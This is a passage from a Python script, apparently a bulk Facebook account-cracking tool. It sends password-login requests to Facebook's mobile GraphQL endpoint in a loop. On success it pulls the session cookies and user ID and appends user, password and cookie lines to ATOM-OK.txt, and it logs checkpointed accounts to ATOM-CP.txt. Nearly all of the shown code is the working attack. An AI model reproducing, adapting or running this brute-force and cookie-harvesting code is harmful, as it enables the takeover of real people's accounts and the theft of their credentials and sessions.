                login_url = "https://graph.facebook.com/graphql?method=post&pretty=false&format=json&server_timestamps=true&locale=-&purpose=fetch&fb_api_req_friendly_name=FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request&fb_api_caller_class=graphservice&client_doc_id=11994080424240083948543644217&variables=%7B%22params%22%3A+%7B%22params%22%3A+%22%7B%5C%22client_input_params%5C%22%3A+%5C%22%7B%5C%5C%5C%22sim_phones%5C%5C%5C%22%3A+%5B%5D%2C+%5C%5C%5C%22secure_family_device_id%5C%5C%5C%22%3A+%5C%5C%5C%22b9a61626-fa7c-4861-8767-c1e6da01c6dc%5C%5C%5C%22%2C+%5C%5C%5C%22auth_secure_device_id%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22has_whatsapp_installed%5C%5C%5C%22%3A+1%2C+%5C%5C%5C%22password%5C%5C%5C%22%3A+%5C%5C%5C%22%23PWD_FB4A%3A0%3A1750684174%3A838394%5C%5C%5C%22%2C+%5C%5C%5C%22sso_token_map_json_string%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22event_flow%5C%5C%5C%22%3A+%5C%5C%5C%22login_manual%5C%5C%5C%22%2C+%5C%5C%5C%22sim_serials%5C%5C%5C%22%3A+%5B%5D%2C+%5C%5C%5C%22client_known_key_hash%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22encrypted_msisdn%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22should_show_nested_nta_from_aymh%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22device_id%5C%5C%5C%22%3A+%5C%5C%5C%22e5603942-884b-4fe6-92d5-91a9f20a4860%5C%5C%5C%22%2C+%5C%5C%5C%22login_attempt_count%5C%5C%5C%22%3A+1%2C+%5C%5C%5C%22machine_id%5C%5C%5C%22%3A+%5C%5C%5C%2293zxslwjtb7qizoe21we910k%5C%5C%5C%22%2C+%5C%5C%5C%22flash_call_permission_status%5C%5C%5C%22%3A+%5C%5C%5C%22%7B%5C%5C%5C%5C%5C%5C%5C22READ_PHONE_STATE%5C%5C%5C%5C%5C%5C%5C%22%3A+%5C%5C%5C%5C%5C%5C%5C%22DENIED%5C%5C%5C%5C%5C%5C%5C%22%2C+%5C%5C%5C%5C%5C%5C%5C%22READ_CALL_LOG%5C%5C%5C%5C%5C%5C%5C%22%3A+%5C%5C%5C%5C%5C%5C%5C%22DENIED%5C%5C%5C%5C%5C%5C%5C%22%2C+%5C%5C%5C%5C%5C%5C%5C%22ANSWER_PHONE_CALLS%5C%5C%5C%5C%5C%5C%5C%22%3A+%5C%5C%5C%5C%5C%5C%5C%22DENIED%5C%5C%5C%5C%5C%5C%5C%22%7D%5C%5C%5C%22%2C+%5C%5C%5C%22accounts_list%5C%5C%5C%22%3A+%5B%5D%2C+%5C%5C%5C%22family_device_id%5C%5C%5C%22%3A+%5C%5C%5C%2283914afd-9840-47b5-9210-b2b96234b0e3%5C%5C%5C%22%2C+%5C%5C%5C%22fb_ig_device_id%5C%5C%5C%22%3A+%5B%5D%2C+%5C%5C%5C%22device_emails%5C%5C%5C%22%3A+%5B%5D%2C+%5C%5C%5C%22try_num%5C%5C%5C%22%3A+3%2C+%5C%5C%5C%22lois_settings%5C%5C%5C%22%3A+%5C%5C%5C%22%7B%5C%5C%5C%5C%5C%5C%5C%22lois_token%5C%5C%5C%5C%5C%5C%5C%22%3A+%5C%5C%5C%5C%5C%5C%5C%22%5C%5C%5C%5C%5C%5C%5C%22%2C+%5C%5C%5C%5C%5C%5C%5C%22lara_override%5C%5C%5C%5C%5C%5C%5C%22%3A+%5C%5C%5C%5C%5C%5C%5C%22%5C%5C%5C%5C%5C%5C%5C%22%7D%5C%5C%5C%22%2C+%5C%5C%5C%22event_step%5C%5C%5C%22%3A+%5C%5C%5C%22home_page%5C%5C%5C%22%2C+%5C%5C%5C%22headers_infra_flow_id%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22openid_tokens%5C%5C%5C%22%3A+%7B%7D%2C+%5C%5C%5C%22contact_point%5C%5C%5C%22%3A+%5C%5C%5C%228383941953%5C%5C%5C%22%7D%5C%22%2C+%22server_params%22%3A+%5C%22%7B%5C%5C%5C%22should_trigger_override_login_2fa_action%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22is_from_logged_out%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22should_trigger_override_login_success_action%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22login_credential_type%5C%5C%5C%22%3A+%5C%5C%5C%22none%5C%5C%5C%22%2C+%5C%5C%5C%22server_login_source%5C%5C%5C%22%3A+%5C%5C%5C%22login%5C%5C%5C%22%2C+%5C%5C%5C%22waterfall_id%5C%5C%5C%22%3A+%5C%5C%5C%22fb23d1ca-e80a-46b4-8577-6546ec37d40a%5C%5C%5C%22%2C+%5C%5C%5C%22login_source%5C%5C%5C%22%3A+%5C%5C%5C%22Login%5C%5C%5C%22%2C+%5C%5C%5C%22is_platform_login%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22pw_encryption_try_count%5C%5C%5C%22%3A+1%2C+%5C%5C%5C%22INTERNAL__latency_qpl_marker_id%5C%5C%5C%22%3A+36707139%2C+%5C%5C%5C%22offline_experiment_group%5C%5C%5C%22%3A+%5C%5C%5C%22caa_iteration_v6_perf_fb_2%5C%5C%5C%22%2C+%5C%5C%5C%22is_from_landing_page%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22password_text_input_id%5C%5C%5C%22%3A+%5C%5C%5C%22pijnxb%3A28%5C%5C%5C%22%2C+%5C%5C%5C%22is_from_empty_password%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22ar_event_source%5C%5C%5C%22%3A+%5C%5C%5C%22login_home_page%5C%5C%5C%22%2C+%5C%5C%5C%22username_text_input_id%5C%5C%5C%22%3A+%5C%5C%5C%22o7i143%3A62%5C%5C%5C%22%2C+%5C%5C%5C%22layered_homepage_experimnt_group%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22device_id%5C%5C%5C%22%3A+%5C%5C%5C%22f636f5ad-e27e-464d-96af-cdc57ee227e8%5C%5C%5C%22%2C+%5C%5C%5C%22INTERNAL__latency_qpl_instance_id%5C%5C%5C%22%3A+%5C%5C%5C%220.5827769600175628%5C%5C%5C%22%2C+%5C%5C%5C%22reg_flow_source%5C%5C%5C%22%3A+%5C%5C%5C%22login_home_native_integration_point%5C%5C%5C%22%2C+%5C%5C%5C%22is_caa_perf_enabled%5C%5C%5C%22%3A+1%2C+%5C%5C%5C%22credential_type%5C%5C%5C%22%3A+%5C%5C%5C%22password%5C%5C%5C%22%2C+%5C%5C%5C%22is_from_password_entry_page%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22caller%5C%5C%5C%22%3A+%5C%5C%5C%22gslr%5C%5C%5C%22%2C+%5C%5C%5C%22family_device_id%5C%5C%5C%22%3A+%5C%5C%5C%22556c8fb8-0b9a-49d0-8d23-002972ac7e25%5C%5C%5C%22%2C+%5C%5C%5C%22INTERNAL_INFRA_THEME%5C%5C%5C%22%3A+%5C%5C%5C%22harm_f%2Cdefault%2Charm_f%5C%5C%5C%22%2C+%5C%5C%5C%22is_from_assistive_id%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22access_flow_version%5C%5C%5C%22%3A+%5C%5C%5C%22F2_FLOW%5C%5C%5C%22%2C+%5C%5C%5C%22is_from_logged_in_switcher%5C%5C%5C%22%3A+0%7D%5C%22%7D%22%2C+%22bloks_versioning_id%22%3A+%22c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722%22%2C+%22app_id%22%3A+%22com.bloks.www.bloks.caa.login.async.send_login_request%22%7D%2C+%22scale%22%3A+%2261%22%2C+%22nt_context%22%3A+%22%7B%5C%22using_white_navbar%5C%22%3A+%5C%22True%5C%22%2C+%5C%22pixel_ratio%5C%22%3A+3%2C+%5C%22is_push_on%5C%22%3A+%5C%5C%5C%22False%5C%22%2C+%5C%22styles_id%5C%22%3A+%5C%22196702b4d5dfb9dbf1ded6d58ee42767%5C%22%2C+%5C%22bloks_version%5C%22%3A+%5C%22c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722%5C%22%7D%22%7D&fb_api_analytics_tags=%5B%22GraphServices%22%5D&client_trace_id=53c1be29-01f1-4f88-bbdf-8055602f1c81"
                response = ses.post(url=login_url, data=data, headers=headers, allow_redirects=False).json()
                if "session_key" in response:
                    kuki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                    user = re.findall('c_user=(.*);xs', kuki)[0]
                    req = requests.get(f"https://graph.facebook.com/{user}/picture?type=normal").text
                    if "Photoshop" in req:
                        print(f"\r\r\x1b[38;5;46mATOM-OK • {user} • {pas} • {kuki}")
                        open("/sdcard/ATOM-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                        self.oks.append(user)
                        break
                elif "www.facebook.com" in response["error"]["message"]:
                    try:user=response["error"]["error_data"]["uid"]
                    except:user=ids
                    open("/sdcard/ATOM-CP.txt","a").write(user+"|"+pas+"\n")
                    self.cps.append(user)
                    break
                else:continue
            self.loop += 1
        except cerror:time.sleep(10)
        except Exception as e:pass


System().Main()
